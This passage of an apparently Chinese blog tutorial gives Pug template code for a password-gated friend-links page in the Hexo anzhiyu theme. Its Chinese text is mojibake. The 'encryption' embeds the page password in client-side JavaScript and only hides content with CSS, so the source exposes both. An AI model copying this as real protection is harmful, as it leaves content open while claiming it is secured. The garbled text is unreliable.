cf-href=url_for(item.link), rel=&#x27;external nofollow&#x27;)</span><br><span class="line">                    .site-card-avatar</span><br><span class="line">                      img.flink-avatar.cf-friends-avatar.no-fancybox(data-lazy-src=item.avatar, cf-src=url_for(item.avatar), onerror=`this.onerror=null;this.src=&#x27;$&#123;theme.default_img&#125;&#x27;`, alt=item.name, src=item.avatar)</span><br><span class="line">                    .site-card-text</span><br><span class="line">                      span.title.cf-friends-name #[=item.name]</span><br><span class="line">                      span.desc(title=`$&#123;item.descr&#125;`) #[=item.descr]</span><br><span class="line">          else if i.flink_style === &#x27;flexcard&#x27;</span><br><span class="line">            .flexcard-flink-list</span><br><span class="line">              each item in i.link_list</span><br><span class="line">                a.flink-list-card.cf-friends-link(href=url_for(item.link) cf-href=url_for(item.link) target=&#x27;_blank&#x27; data-title=item.descr)</span><br><span class="line">                  .wrapper.cover</span><br><span class="line">                    - var siteshot = item.siteshot ? url_for(item.siteshot) : &#x27;https://image.thum.io/get/width/400/crop/800/allowJPG/wait/20/noanimate/&#x27; + item.link</span><br><span class="line">                    if theme.lazyload.enable</span><br><span class="line">                      img.cover.fadeIn(data-lazy-src=siteshot onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.post_page) + `&#x27;` alt=&#x27;cover&#x27; )</span><br><span class="line">                    else</span><br><span class="line">                      img.cover.fadeIn(src=siteshot onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.post_page) + `&#x27;` alt=&#x27;cover&#x27; )    </span><br><span class="line">                  .info</span><br><span class="line">                    if theme.lazyload.enable</span><br><span class="line">                      img.cf-friends-avatar.no-lightbox.flink-avatar(data-lazy-src=url_for(item.avatar) cf-src=url_for(item.avatar) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=&#x27;cover&#x27; )</span><br><span class="line">                    else</span><br><span class="line">                      img.cf-friends-avatar.no-lightbox(src=url_for(item.avatar) cf-src=url_for(item.avatar) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=&#x27;cover&#x27; )</span><br><span class="line">                    span.flink-sitename.cf-friends-name= item.name</span><br><span class="line">    != page.content</span><br><span class="line"></span><br><span class="line">//- åªåœ¨å¯ç”¨åŠ å¯†åŠŸèƒ½æ—¶æ‰åŠ è½½JavaScript</span><br><span class="line">if enableEncryption</span><br><span class="line">  script.</span><br><span class="line">    // é¡µé¢åŠ è½½æ—¶ç«‹å³æ£€æŸ¥åŠ å¯†çŠ¶æ€</span><br><span class="line">    document.addEventListener(&#x27;DOMContentLoaded&#x27;, function() &#123;</span><br><span class="line">      const encryptedContent = document.getElementById(&#x27;encrypted-content&#x27;);</span><br><span class="line">      const encryptContainer = document.getElementById(&#x27;hexo-blog-encrypt&#x27;);</span><br><span class="line">      </span><br><span class="line">      // å¼ºåˆ¶æ˜¾ç¤ºåŠ å¯†ç•Œé¢ï¼Œéšè—å†…å®¹</span><br><span class="line">      if (encryptContainer) encryptContainer.style.display = &#x27;block&#x27;;</span><br><span class="line">      if (encryptedContent) encryptedContent.style.display = &#x27;none&#x27;;</span><br><span class="line">      </span><br><span class="line">      // æ£€æŸ¥ä¿å­˜çš„å¯†ç </span><br><span class="line">      const savedPass = localStorage.getItem(&#x27;friends-page-pass&#x27;);</span><br><span class="line">      const correctPass = &#x27;#&#123;page.password&#125;&#x27;;</span><br><span class="line">      </span><br><span class="line">      if (savedPass === correctPass) &#123;</span><br><span class="line">        // å¯†ç æ­£ç¡®ï¼Œæ˜¾ç¤ºå†…å®¹</span><br><span class="line">        if (encryptedContent) encryptedContent.style.display = &#x27;block&#x27;;</span><br><span class="line">        if (encryptContainer) encryptContainer.style.display = &#x27;none&#x27;;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        // å¯†ç é”™è¯¯æˆ–æœªä¿å­˜ï¼Œæ¸…é™¤å¯èƒ½å­˜åœ¨çš„é”™è¯¯ç¼“å­˜</span><br><span class="line">        localStorage.removeItem(&#x27;friends-page-pass&#x27;);</span><br><span class="line">        if (encryptedContent) encryptedContent.style.display = &#x27;none&#x27;;</span><br><span class="line">        if (encryptContainer) encryptContainer.style.display = &#x27;block&#x27;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    function decryptFriends() &#123;</span><br><span class="line">      const inputPass = document.getElementById(&#x27;hbePass&#x27;).value;</span><br><span class="line">      const correctPass = &#x27;#&#123;page.password&#125;&#x27;;</span><br><span class="line">      const encryptedContent = document.getElementById(&#x27;encrypted-content&#x27;);</span><br><span class="line">      const errorElement = document.getElementById(&#x27;hbeError&#x27;);</span><br><span class="line">      const encryptContainer = document.getElementById(&#x27;hexo-blog-encrypt&#x27;);</span><br><span class="line">      </span><br><span class="line">      if (inputPass === correctPass) &#123;</span><br><span class="line">        encryptedContent.style.display = &#x27;block&#x27;;</span><br><span class="line">        encryptContainer.style.display = &#x27;none&#x27;;</span><br><span class="line">        errorElement.style.display = &#x27;none&#x27;;</span><br><span class="line">        // ä¿å­˜å¯†ç </span><br><span class="line">        localStorage.setItem(&#x27;friends-page-pass&#x27;, inputPass);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        errorElement.style.display = &#x27;block&#x27;;</span><br><span class="line">        // æ¸…é™¤é”™è¯¯çš„ä¿å­˜</span><br><span class="line">        localStorage.removeItem(&#x27;friends-page-pass&#x27;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ§åˆ¶å™¨é…ç½®ï¼š</p><p>åœ¨ç«™ç‚¹é…ç½®æ–‡ä»¶orä¸»é¢˜é…ç½®æ–‡ä»¶ä¸­æ·»åŠ ï¼š</p><p><code>encrypted_friends: false</code></p><p>æˆ–è€…ï¼š</p><p><code>encrypted_friends: true</code></p><p>ä¹‹åè¿›è¡Œhexoä¸‰è¿ï¼›</p><h1 id="v1-0"><a href="#v1-0" class="headerlink" title="v1.0"></a>v1.0</h1><h2 id="æ•ˆæœå›¾"><a href="#æ•ˆæœå›¾" class="headerlink" title="æ•ˆæœå›¾"></a>æ•ˆæœå›¾</h2><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511032155173.png" alt="image-20251103215515074"></p><h2 id="éƒ¨ç½²æ•™ç¨‹"><a href="#éƒ¨ç½²æ•™ç¨‹" class="headerlink" title="éƒ¨ç½²æ•™ç¨‹"></a>éƒ¨ç½²æ•™ç¨‹</h2><h3 id="å‰ç½®ï¼š"><a href="#å‰ç½®ï¼š" class="headerlink" title="å‰ç½®ï¼š"></a>å‰ç½®ï¼š</h3><p>éƒ¨ç½²å¥½ä½ çš„åšå®¢ï¼ˆæœ¬ç«™ä½¿ç”¨çš„æ˜¯åŸºäºhexoæ¡†æ¶anzhiyuä¸»é¢˜çš„éƒ¨ç½²ï¼‰ä¸”é…ç½®å¥½anzhiyuç‹¬æœ‰çš„å‹é“¾é¡µé¢</p><h3 id="æ­¥éª¤ï¼š"><a href="#æ­¥éª¤ï¼š" class="headerlink" title="æ­¥éª¤ï¼š"></a>æ­¥éª¤ï¼š</h3><ol><li>æ‰¾åˆ°<code>\themes\anzhiyu\layout\includes\page\flink.pug</code>æ–‡ä»¶ï¼Œå°†å…¶æ›¿æ¢ä¸ºä»¥ä¸‹å†…å®¹ï¼š</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br></pre></td><td class="code"><pre><span class="line">//- includes/page/flink.pug</span><br><span class="line"></span><br><span class="line">if page.password</span><br><span class="line">  #hexo-blog-encrypt</span><br><span class="line">    .hbe-input-container</span><br><span class="line">      input(type=&quot;password&quot; id=&quot;hbePass&quot; placeholder=page.message || &quot;è¯·è¾“å…¥å¯†ç æŸ¥çœ‹å‹é“¾&quot;)</span><br><span class="line">      button(onclick=&quot;decryptFriends()&quot;) è§£å¯†æŸ¥çœ‹</span><br><span class="line">    #hbeError(style=&quot;display:none;color:red;margin-top:10px;&quot;)= page.wrong_pass_message || &#x27;å¯†ç é”™è¯¯ï¼&#x27;</span><br><span class="line"></span><br><span class="line">  #encrypted-content(style=&quot;display:none;&quot;)</span><br><span class="line">    #article-container</span><br><span class="line">      if theme.linkPageTop &amp;&amp; theme.linkPageTop.enable</span><br><span class="line">        #flink-banners</span><br><span class="line">          .banner-top-box</span><br><span class="line">            .flink-banners-title</span><br><span class="line">              .banners-title-small å‹æƒ…é“¾æ¥</span><br><span class="line">              .banners-title-big=theme.linkPageTop ? theme.linkPageTop.title : &quot;ä¸æ•°ç™¾ååšä¸»æ— é™è¿›æ­¥&quot;</span><br><span class="line">            .banner-button-group</span><br><span class="line">              if (theme.friends_vue.apiurl)</span><br><span class="line">                a.banner-button.secondary.no-text-decoration(onclick=&quot;friendChainRandomTransmission()&quot;)</span><br><span class="line">                  i.anzhiyufont.anzhiyu-icon-paper-plane1</span><br><span class="line">                  span.banner-button-text éšæœºè®¿é—®</span><br><span class="line">              if theme.linkPageTop.addFriendPlaceholder &amp;&amp; theme.comments.use == &#x27;Twikoo&#x27; &amp;&amp; theme.twikoo.envId</span><br><span class="line">                a.banner-button.no-text-decoration(onclick=&quot;anzhiyu.addFriendLink()&quot;)</span><br><span class="line">                  i.anzhiyufont.anzhiyu-icon-arrow-circle-right</span><br><span class="line">                  span.banner-button-text ç”³è¯·å‹é“¾</span><br><span class="line">          #skills-tags-group-all</span><br><span class="line">            .tags-group-wrapper</span><br><span class="line">              - function getAvatarWithoutExclamationMark(url) &#123;</span><br><span class="line">              -   const index = url.indexOf(&#x27;!&#x27;);</span><br><span class="line">              -   return index !== -1 ? url.substring(0, index) : url;</span><br><span class="line">              - &#125;</span><br><span class="line">              each y in [1,2]</span><br><span class="line">                each i, index in site.data.link.slice(0, 15)</span><br><span class="line">                  - const link_list = i.link_list.slice()</span><br><span class="line">                  - const hundredSuffix = i.hundredSuffix ? i.hundredSuffix : &quot;&quot;</span><br><span class="line">                  - const evenNum = link_list.filter((x, index) =&gt; index % 2 === 0);</span><br><span class="line">                  - const oddNum = link_list.filter((x, index) =&gt; index % 2 === 1);</span><br><span class="line">                  each item, index2 in link_list.slice(0, Math.min(evenNum.length, oddNum.length))</span><br><span class="line">                    - const index = index2 * 2</span><br><span class="line">                    if (index &lt;= 15 &amp;&amp; typeof evenNum[index] !== &#x27;undefined&#x27; &amp;&amp; typeof oddNum[index] !== &#x27;undefined&#x27;)</span><br><span class="line">                      - let oddNumAvatar = getAvatarWithoutExclamationMark(oddNum[index].avatar);</span><br><span class="line">                      - let evenNumAvatar = getAvatarWithoutExclamationMark(evenNum[index].avatar);</span><br><span class="line">                      .tags-group-icon-pair</span><br><span class="line">                        a.tags-group-icon.no-text-decoration(href=url_for(evenNum[index].link), title=evenNum[index].name)</span><br><span class="line">                          img.no-lightbox(title=evenNum[index].name, src=url_for(evenNumAvatar + hundredSuffix) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=evenNum[index].name)</span><br><span class="line">                        a.tags-group-icon.no-text-decoration(href=url_for(oddNum[index].link), title=oddNum[index].name)</span><br><span class="line">                          img.no-lightbox(title=oddNum[index].name, src=url_for(oddNumAvatar + hundredSuffix) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=oddNum[index].name)</span><br><span class="line">      if theme.friends_vue &amp;&amp; theme.friends_vue.enable</span><br><span class="line">        .title-h2-a</span><br><span class="line">          .title-h2-a-left</span><br><span class="line">            h2(style=&#x27;padding-top:0;margin:.6rem 0 .6rem&#x27;) ğŸ£ é’“é±¼</span><br><span class="line">            a.random-post-start.no-text-decoration(href=&#x27;javascript:fetchRandomPost();&#x27;)</span><br><span class="line">              i.anzhiyufont.anzhiyu-icon-arrow-rotate-right</span><br><span class="line">          .title-h2-a-right</span><br><span class="line">            a.random-post-all.no-text-decoration(href=&#x27;/link/&#x27;) å…¨éƒ¨å‹é“¾</span><br><span class="line">        #random-post</span><br><span class="line">        script(defer data-pjax src=url_for(theme.asset.random_friends_post_js))</span><br><span class="line">      </span><br><span class="line">      .flink</span><br><span class="line">        if site.data.link</span><br><span class="line">          each i in site.data.link</span><br><span class="line">            if i.class_name</span><br><span class="line">              h2!= i.class_name + &quot;(&quot; + i.link_list.length + &quot;)&quot;</span><br><span class="line">            if i.class_desc</span><br><span class="line">              .flink-desc!=i.class_desc</span><br><span class="line">            if i.flink_style === &#x27;anzhiyu&#x27;</span><br><span class="line">              div(class=i.lost_contact ? &#x27;anzhiyu-flink-list cf-friends-lost-contact&#x27; : &#x27;anzhiyu-flink-list&#x27;)</span><br><span class="line">                if i.link_list</span><br><span class="line">                  each item in i.link_list</span><br><span class="line">                    - let color = item.color || &quot;&quot;</span><br><span class="line">                    - let tag = item.tag || &quot;&quot;</span><br><span class="line">                    </span><br><span class="line">                    .flink-list-item</span><br><span class="line">                      if color == &quot;vip&quot; &amp;&amp; tag</span><br><span class="line">                        span.site-card-tag.vip #[=tag]</span><br><span class="line">                          i.light</span><br><span class="line">                      else if color == &quot;speed&quot; &amp;&amp; tag</span><br><span class="line">                        span.site-card-tag.speed #[=tag]</span><br><span class="line">                      else if tag</span><br><span class="line">                        span.site-card-tag(style=`background-color: $&#123;color&#125;`) #[=tag]</span><br><span class="line">                      else if item.recommend</span><br><span class="line">                        span.site-card-tag è</span><br><span class="line">                      if i.lost_contact</span><br><span class="line">                        a.cf-friends-link(href=url_for(item.link) title=item.name target=&quot;_blank&quot;)</span><br><span class="line">                          if theme.lazyload.enable</span><br><span class="line">                            img.no-lightbox(data-lazy-src=url_for(item.avatar) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=item.name )</span><br><span class="line">                          else</span><br><span class="line">                            img.cf-friends-avatar.no-lightbox(src=url_for(item.avatar) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=item.name )</span><br><span class="line">                          .flink-item-info</span><br><span class="line">                            .flink-item-name.cf-friends-name-lost-contact= item.name</span><br><span class="line">                      else</span><br><span class="line">                        a.cf-friends-link(href=url_for(item.link) cf-href=url_for(item.link) title=item.name target=&quot;_blank&quot;)</span><br><span class="line">                          if theme.lazyload.enable</span><br><span class="line">                            img.cf-friends-avatar.no-lightbox(data-lazy-src=url_for(item.avatar), cf-src=url_for(item.avatar), onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=item.name )</span><br><span class="line">                          else</span><br><span class="line">                            img.cf-friends-avatar.no-lightbox(src=url_for(item.avatar) cf-src=url_for(item.avatar) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=item.name )</span><br><span class="line">                          .flink-item-info</span><br><span class="line">                            .flink-item-name.cf-friends-name= item.name</span><br><span class="line">                            .flink-item-desc(title=item.descr)= item.descr</span><br><span class="line">            </span><br><span class="line">            else if i.flink_style === &#x27;telescopic&#x27;</span><br><span class="line">              .telescopic-site-card-group</span><br><span class="line">                each item in i.link_list</span><br><span class="line">                  - let color = item.color || &quot;&quot;</span><br><span class="line">                  - let tag = item.tag || &quot;&quot;</span><br><span class="line">                  - let siteshot = item.siteshot || `https://image.thum.io/get/width/400/crop/800/allowJPG/wait/20/noanimate/$&#123;item.link&#125;` || theme.default_img</span><br><span class="line">                  .site-card</span><br><span class="line">                    if color == &quot;vip&quot; &amp;&amp; tag</span><br><span class="line">                      span.site-card-tag.vip #[=tag]</span><br><span class="line">                        i.light</span><br><span class="line">                    else if color == &quot;speed&quot; &amp;&amp; tag</span><br><span class="line">                      span.site-card-tag.speed #[=tag]</span><br><span class="line">                    else if tag</span><br><span class="line">                      span.site-card-tag(style=`background-color: $&#123;color&#125;`) #[=tag]</span><br><span class="line">                    else if item.recommend</span><br><span class="line">                      span.site-card-tag è</span><br><span class="line">                    a.img.no-text-decoration(target=&#x27;_blank&#x27;, title=`$&#123;item.name&#125;`, href=`$&#123;item.link&#125;`, rel=&#x27;external nofollow&#x27;)</span><br><span class="line">                      img.flink-avatar(data-lazy-src=siteshot, onerror=`this.onerror=null;this.src=&#x27;$&#123;theme.default_img&#125;&#x27;`, alt=item.name, style=&quot;pointer-events: none;&quot;, src=`$&#123;siteshot&#125;`)</span><br><span class="line">                    a.info.cf-friends-link.no-text-decoration(target=&#x27;_blank&#x27;, title=`$&#123;item.name&#125;`, href=`$&#123;item.link&#125;`, cf-href=url_for(item.link), rel=&#x27;external nofollow&#x27;)</span><br><span class="line">                      .site-card-avatar</span><br><span class="line">                        img.flink-avatar.cf-friends-avatar.no-fancybox(data-lazy-src=item.avatar, cf-src=url_for(item.avatar), onerror=`this.onerror=null;this.src=&#x27;$&#123;theme.default_img&#125;&#x27;`, alt=item.name, src=item.avatar)</span><br><span class="line">                      .site-card-text</span><br><span class="line">                        span.title.cf-friends-name #[=item.name]</span><br><span class="line">                        span.desc(title=`$&#123;item.descr&#125;`) #[=item.descr]</span><br><span class="line">            else if i.flink_style === &#x27;flexcard&#x27;</span><br><span class="line">              .flexcard-flink-list</span><br><span class="line">                each item in i.link_list</span><br><span class="line">                  a.flink-list-card.cf-friends-link(href=url_for(item.link) cf-href=url_for(item.link) target=&#x27;_blank&#x27; data-title=item.descr)</span><br><span class="line">                    .wrapper.cover</span><br><span class="line">                      - var siteshot = item.siteshot ? url_for(item.siteshot) : &#x27;https://image.thum.io/get/width/400/crop/800/allowJPG/wait/20/noanimate/&#x27; + item.link</span><br><span class="line">                      if theme.lazyload.enable</span><br><span class="line">                        img.cover.fadeIn(data-lazy-src=siteshot onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.post_page) + `&#x27;` alt=&#x27;cover&#x27; )</span><br><span class="line">                      else</span><br><span class="line">                        img.cover.fadeIn(src=siteshot onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.post_page) + `&#x27;` alt=&#x27;cover&#x27; )    </span><br><span class="line">                    .info</span><br><span class="line">                      if theme.lazyload.enable</span><br><span class="line">                        img.cf-friends-avatar.no-lightbox.flink-avatar(data-lazy-src=url_for(item.avatar) cf-src=url_for(item.avatar) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=&#x27;cover&#x27; )</span><br><span class="line">                      else</span><br><span class="line">                        img.cf-friends-avatar.no-lightbox(src=url_for(item.avatar) cf-src=url_for(item.avatar) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=&#x27;cover&#x27; )</span><br><span class="line">                      span.flink-sitename.cf-friends-name= item.name</span><br><span class="line">      != page.content</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">  #article-container</span><br><span class="line">    if theme.linkPageTop &amp;&amp; theme.linkPageTop.enable</span><br><span class="line">      #flink-banners</span><br><span class="line">        .banner-top-box</span><br><span class="line">          .flink-banners-title</span><br><span class="line">            .banners-title-small å‹æƒ…é“¾æ¥</span><br><span class="line">            .banners-title-big=theme.linkPageTop ? theme.linkPageTop.title : &quot;ä¸æ•°ç™¾ååšä¸»æ— é™è¿›æ­¥&quot;</span><br><span class="line">          .banner-button-group</span><br><span class="line">            if (theme.friends_vue.apiurl)</span><br><span class="line">              a.banner-button.secondary.no-text-decoration(onclick=&quot;friendChainRandomTransmission()&quot;)</span><br><span class="line">                i.anzhiyufont.anzhiyu-icon-paper-plane1</span><br><span class="line">                span.banner-button-text éšæœºè®¿é—®</span><br><span class="line">            if theme.linkPageTop.addFriendPlaceholder &amp;&amp; theme.comments.use == &#x27;Twikoo&#x27; &amp;&amp; theme.twikoo.envId</span><br><span class="line">              a.banner-button.no-text-decoration(onclick=&quot;anzhiyu.addFriendLink()&quot;)</span><br><span class="line">                i.anzhiyufont.anzhiyu-icon-arrow-circle-right</span><br><span class="line">                span.banner-button-text ç”³è¯·å‹é“¾</span><br><span class="line">        #skills-tags-group-all</span><br><span class="line">          .tags-group-wrapper</span><br><span class="line">            - function getAvatarWithoutExclamationMark(url) &#123;</span><br><span class="line">            -   const index = url.indexOf(&#x27;!&#x27;);</span><br><span class="line">            -   return index !== -1 ? url.substring(0, index) : url;</span><br><span class="line">            - &#125;</span><br><span class="line">            each y in [1,2]</span><br><span class="line">              each i, index in site.data.link.slice(0, 15)</span><br><span class="line">                - const link_list = i.link_list.slice()</span><br><span class="line">                - const hundredSuffix = i.hundredSuffix ? i.hundredSuffix : &quot;&quot;</span><br><span class="line">                - const evenNum = link_list.filter((x, index) =&gt; index % 2 === 0);</span><br><span class="line">                - const oddNum = link_list.filter((x, index) =&gt; index % 2 === 1);</span><br><span class="line">                each item, index2 in link_list.slice(0, Math.min(evenNum.length, oddNum.length))</span><br><span class="line">                  - const index = index2 * 2</span><br><span class="line">                  if (index &lt;= 15 &amp;&amp; typeof evenNum[index] !== &#x27;undefined&#x27; &amp;&amp; typeof oddNum[index] !== &#x27;undefined&#x27;)</span><br><span class="line">                    - let oddNumAvatar = getAvatarWithoutExclamationMark(oddNum[index].avatar);</span><br><span class="line">                    - let evenNumAvatar = getAvatarWithoutExclamationMark(evenNum[index].avatar);</span><br><span class="line">                    .tags-group-icon-pair</span><br><span class="line">                      a.tags-group-icon.no-text-decoration(href=url_for(evenNum[index].link), title=evenNum[index].name)</span><br><span class="line">                        img.no-lightbox(title=evenNum[index].name, src=url_for(evenNumAvatar + hundredSuffix) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=evenNum[index].name)</span><br><span class="line">                      a.tags-group-icon.no-text-decoration(href=url_for(oddNum[index].link), title=oddNum[index].name)</span><br><span class="line">                        img.no-lightbox(title=oddNum[index].name, src=url_for(oddNumAvatar + hundredSuffix) onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.error_img.flink) + `&#x27;` alt=oddNum[index].name)</span><br><span class="line">    if theme.friends_vue &amp;&amp; theme.friends_vue.enable</span><br><span class="line">      .title-h2-a</span><br><span class="line">        .title-h2-a-left</span><br><span class="line">          h2(style=&#x27;padding-top:0;margin:.6rem 0 .6rem&#x27;) ğŸ£ é’“é±¼</span><br><span class="line">          a.random-post-start.no-text-decoration(href=&#x27;javascript:fetchRandomPost();&#x27;)</span><br><span class="line">            i.anzhiyufont.anzhiyu-icon-arrow-rotate-right</span><br><span class="line">        .title-h2-a-right</span><br><span class="line">          a.random-post-all.no-text-decoration(href=&#x27;/link/&#x27;) å…¨éƒ¨å‹é“¾</span><br><span class="line">      #random-post</span><br><span class="line">      script(defer data-pjax src=url_for(theme.asset.random_friends_post_js))</span><br><span class="line">    </span><br><span class="line">    .flink</span><br><span class="line">      if site.data.link</span><br><span class="line">        each i in site.data.link</span><br><span class="line">          if i.class_name</span><br><span class="line">            h2!= i.class_name + &quot;(&quot; + i.link_list.length + &quot;)&quot;</span><br><span class="line">          if i.class_desc</span><br><span class="line">            .flink-desc!=i.class_desc</span><br><span class="line">          if i.flink_style === &#x27;anzhiyu&#x27;</span><br><span class="line">            div(class=i.lost_contact ? &#x27;anzhiyu-flink-list cf-friends-lost-contact&#x27; : 